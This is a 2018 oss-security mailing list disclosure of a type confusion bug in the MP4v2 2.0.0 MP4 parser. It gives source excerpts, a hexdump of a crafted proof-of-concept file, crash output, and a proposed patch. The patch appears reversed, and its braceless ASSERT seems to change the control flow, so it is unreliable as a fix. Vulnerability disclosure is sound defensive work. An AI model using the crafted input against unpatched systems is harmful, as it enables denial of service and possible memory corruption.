X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["6235" "Tuesday" "17" "July" "2018" "14:30:48" "+0800" "Ruikai Liu" "lrk700@gmail.com" "<CAB6DpjV_tb8s0O39dgocNk23cRK3TcQeAeA34wUhYkeXooM1wA@mail.gmail.com>" "175" "[oss-security] Type confusion in MP4v2 2.0.0" nil nil nil "7" "2018071706:30:48" "[oss-security] Type confusion in MP4v2 2.0.0" (number mark "U       lrk700@gmail Jul 17  175/6235  " thread-indent "\"[oss-security] Type confusion in MP4v2 2.0.0\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 1470 invoked by uid 550); 17 Jul 2018 08:31:32 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 20446 invoked from network); 17 Jul 2018 06:31:12 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20161025;
        h=mime-version:from:date:message-id:subject:to;
        bh=0yhPMZBb/FmvgEbRRVOL1165eaPnG11NfrOm0HTgZ6I=;
        b=Ik5ZN0vDW1AbUvUXFIoDNUZvcOHnwG/BleSYFerq3p+169GckasyT1gXeOVUnbeFlO
         EnuLLfmZWebL53sRWHugK44tDr6P+apzAVOmiZBZ54/wGqeRI0xVPuruiqOywbrm+ijK
         0zXTnznmQ/zmE7TbY/RrVJ4qgGx3aeaqZ4S0RJH456o5EJxfv+KDu1weebuM1c9NldEV
         6ht2CyD+1MY6+TaJPdGfsVlV6HsqRNwAPfsgdVGUl5A4bAUaTlAvfd8FP1W+SQEjz3Ez
         A5fU/jDJuxEMY/JMrYrDm0puTDUBJ/6ifaR7Z88VkETvyzaSV5MGTJTspBPV0vHdkdQC
         oeKg==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20161025;
        h=x-gm-message-state:mime-version:from:date:message-id:subject:to;
        bh=0yhPMZBb/FmvgEbRRVOL1165eaPnG11NfrOm0HTgZ6I=;
        b=EVtp3FQXECoxgbfMiu7YGCEQFtaYwLBT+e7d6YXthKXz5WPgUDpkqZPF3zQD1XejSz
         ceeOc5j3B9LWfIjo0fnhLR3N46zRiXvPaG+0MKIBbncaq5cZQMSgOSDamcjDlDCUVlp9
         xXAcI6G0ArW5veRKoszPCP+cKXiV3jEamDd1tnZh8Vf4pFJoVQwp/C62KiLArXDB5uk2
         jPYO2sKBGC9XMKHDMN9LZ7ODzI3+OhW4CcyqjWrSjZuEIWUVvcA6s14NpbBBDLWSToVL
         eDoAQM8DmHMiMDDlCkxX7w6tYmSVpPEA1ZHQIZMZnEY/U9+AY+Q3Gv9AU3wQTW7QKiBY
         wrTw==
X-Gm-Message-State: AOUpUlHgTXhcltGya5MYRLTZa3cbQF1qldBg0vCS448N1/9n6Xs/yAzL
	pjjGXnzd+Jhg1pDxGtDuN8lon1SDGJkIsFWTp9J0MQ==
X-Google-Smtp-Source: AAOMgpcQVNxe0CC93BNlmewLklEJZdOQnutUGERTaRYF/kj1OOkcX9Yk6fMEwhb84uvi1yHDVVx/8Do5tCc8OBc/j88=
X-Received: by 2002:a24:e4cc:: with SMTP id o195-v6mr499078ith.145.1531809060168;
 Mon, 16 Jul 2018 23:31:00 -0700 (PDT)
MIME-Version: 1.0
From: Ruikai Liu <lrk700@gmail.com>
Date: Tue, 17 Jul 2018 14:30:48 +0800
Message-ID: <CAB6DpjV_tb8s0O39dgocNk23cRK3TcQeAeA34wUhYkeXooM1wA@mail.gmail.com>
To: oss-security@lists.openwall.com
Content-Type: text/plain; charset="UTF-8"
Subject: [oss-security] Type confusion in MP4v2 2.0.0

Hi,

A type confusion bug is found in MP4v2 2.0.0, a legacy library dealing
with MP4 media file.

========= ilst box =========

According to ref[2], MP4 file could contain an `ilst` box, which
stands for item list. Tags such as album, author, etc., are stored
here. A typical `ilst` box looks like this:

[ilst box] --> [nam box(full name)] -> [data box]
         |---> [cmt box(comment)] -> [data box]
         |---> [day box(created time)] -> [data box]
         ...

MP4v2 would use `MP4ItemAtom` for nam/cmt/... box, and `MP4DataAtom`
for data box:

 772 MP4Atom*
 773 MP4Atom::factory( MP4File &file, MP4Atom* parent, const char* type )
 774 {
 775     // type may be NULL only in case of root-atom
 776     if( !type )
 777         return new MP4RootAtom(file);
 778
 779     // construct atoms which are context-savvy
 780     if( parent ) {
 781         const char* const ptype = parent->GetType();
 782
 783         if( descendsFrom( parent, "ilst" )) {
 784             if( ATOMID( ptype ) == ATOMID( "ilst" ))
 785                 return new MP4ItemAtom( file, type );
 786
 787             if( ATOMID( type ) == ATOMID( "data" ))
 788                 return new MP4DataAtom(file);

However, if a crafted MP4 file has the following structure:

[ilst box] -> [ilst box] -> [data box]

Then `MP4ItemAtom` would be created for the data box instead of
`MP4DataAtom`, since its parent is still of type `ilst`.

========= type confusion =========

Now, to parse the tag info of the MP4 file, `Tags::c_fetch` is called,
which invokes `genericGetItems`:

293 MP4ItmfItemList*
294 genericGetItems( MP4File& file )
295 {
296     MP4Atom* ilst = file.FindAtom( "moov.udta.meta.ilst" );
297     if( !ilst )
298         return __itemListAlloc();
299
300     const uint32_t itemCount = ilst->GetNumberOfChildAtoms();
301     if( itemCount < 1 )
302         return __itemListAlloc();
303
304     MP4ItmfItemList& list = *__itemListAlloc();
305     __itemListResize( list, itemCount );
306
307     for( uint32_t i = 0; i < list.size; i++ )
308         __itemAtomToModel( *(MP4ItemAtom*)ilst->GetChildAtom( i ),
list.elements[i] );
309
310     return &list;
311 }

Here we first find the atom for `ilst`, and then iterate its child
atoms. Remember that there's a duplicate `ilst` in the crafted MP4
file, in which case the root `ilst` atom's child is a `MP4ItemAtom` of
type `ilst`, and its grandchild is a `MP4ItemAtom` of type `data`.

Then in the function `__itemAtomToModel`, the `MP4ItemAtom` of type
`ilst` is parsed:

153 static bool
154 __itemAtomToModel( MP4ItemAtom& item_atom, MP4ItmfItem& model )
...
193     // pass 2: populate data model
194     for( uint32_t i = 0, idata = 0; i < childCount; i++ ) {
195         MP4Atom* atom = item_atom.GetChildAtom( i );
196         if( ATOMID( atom->GetType() ) != ATOMID( "data" ))
197             continue;
198
199         MP4DataAtom& data_atom = *(MP4DataAtom*)atom;

We can see that line 199 would cast its child to `MP4DataAtom`
directly, which in fact is a `MP4ItemAtom`. Since these two objects
are of different layout, operations on the `data_atom` could lead to
memory corruption due to the type confusion.

========= POC =========

Here we create a MP4 file with two `ilst`s:

root@debian:~# xxd c3.mp4
00000000: 0000 0018 6674 7970 6d70 3432 0000 0000  ....ftypmp42....
00000010: 6d70 3432 6973 6f6d 0000 00b8 6d6f 6f76  mp42isom....moov
00000020: 0000 006c 6d76 6864 0000 0000 1234 5678  ...lmvhd.....4Vx
00000030: 2345 6789 0000 0258 9876 5432 0987 6543  #Eg....X.vT2..eC
00000040: 5600 0000 0000 0000 0000 0000 0000 0000  V...............
00000050: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000060: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000070: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000080: 0000 0000 0000 0000 dead beef 0000 0044  ...............D
00000090: 7564 7461 0000 003c 6d65 7461 0000 0000  udta...<meta....
000000a0: 0000 0030 696c 7374 0000 0028 696c 7374  ...0ilst...(ilst
000000b0: 0000 0008 6461 7461 0000 0008 6461 7461  ....data....data
000000c0: 0000 0008 6461 7461 0000 0008 6461 7461  ....data....data

It results in segfault when running `mp4info`:

root@debian:~# mp4info c3.mp4
mp4info version -r
c3.mp4:
ReadChildAtoms: "c3.mp4": In atom data missing child atom data
ReadChildAtoms: "c3.mp4": In atom data missing child atom data
ReadChildAtoms: "c3.mp4": In atom data missing child atom data
ReadChildAtoms: "c3.mp4": In atom data missing child atom data
ReadChildAtoms: "c3.mp4": In atom meta missing child atom hdlr
ReadChildAtoms: "c3.mp4": In atom moov missing child atom trak
Track   Type    Info
ReadChildAtoms: "c3.mp4": In atom data missing child atom data
ReadChildAtoms: "c3.mp4": In atom data missing child atom data
ReadChildAtoms: "c3.mp4": In atom data missing child atom data
ReadChildAtoms: "c3.mp4": In atom data missing child atom data
ReadChildAtoms: "c3.mp4": In atom meta missing child atom hdlr
ReadChildAtoms: "c3.mp4": In atom moov missing child atom trak
Segmentation fault

root@debian:~#
root@debian:~# dpkg -s mp4v2-utils
Package: mp4v2-utils
Status: install ok installed
Priority: optional
Section: sound
Installed-Size: 300
Maintainer: Debian Multimedia Maintainers
<pkg-multimedia-maintainers@lists.alioth.debian.org>
Architecture: amd64
Source: mp4v2 (2.0.0~dfsg0-5)
Version: 2.0.0~dfsg0-5+b1
Depends: libmp4v2-2 (= 2.0.0~dfsg0-5+b1), libc6 (>= 2.14), libgcc1 (>=
1:3.0), libstdc++6 (>= 5.2)

========= fix =========

The bug is caused by the wrong assumption that the child of an `ilst`
can never be an `ilst`. So we could fix it by simply adding an ASSERT:

--- src/mp4atom.cpp     2018-07-17 11:37:01.266702613 +0800
+++ ../mp4v2-2.0.0-orig/src/mp4atom.cpp 2018-07-17 14:20:54.986316212 +0800
@@ -783,6 +783,7 @@

         if( descendsFrom( parent, "ilst" )) {
             if( ATOMID( ptype ) == ATOMID( "ilst" ))
-                ASSERT(ATOMID( type ) != ATOMID( "ilst" ));
                 return new MP4ItemAtom( file, type );

             if( ATOMID( type ) == ATOMID( "data" )) {



========= Reference =========

[1] https://code.google.com/archive/p/mp4v2/
[2] http://xhelmboyx.tripod.com/formats/mp4-layout.txt

-- 
Best regards,

Ruikai Liu
